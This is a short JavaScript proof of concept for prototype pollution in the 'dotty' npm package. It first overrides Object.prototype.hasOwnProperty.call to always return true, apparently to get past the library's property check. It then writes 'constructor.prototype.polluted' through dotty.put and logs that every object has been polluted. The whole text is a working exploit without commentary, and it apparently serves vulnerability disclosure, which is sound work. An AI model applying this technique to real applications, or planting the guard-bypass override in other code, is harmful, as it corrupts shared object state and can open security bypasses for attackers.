Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const dotty = require('dotty');
dotty.put({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);